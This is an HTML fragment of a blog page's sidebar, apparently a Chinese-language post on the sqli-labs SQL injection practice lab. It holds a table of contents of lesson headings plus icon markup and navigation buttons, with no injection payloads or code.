href="#sqli-labs-29"><span class="toc-text"> sqli-labs 29</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs"><span class="toc-text"> sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-17"><span class="toc-text"> Less-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less18"><span class="toc-text"> Less18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less20"><span class="toc-text"> Less20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less23"><span class="toc-text"> Less23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less26"><span class="toc-text"> Less26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less27a"><span class="toc-text"> Less27a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less29"><span class="toc-text"> Less29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less32"><span class="toc-text"> Less32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less38"><span class="toc-text"> Less38</span></a></li></ol></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
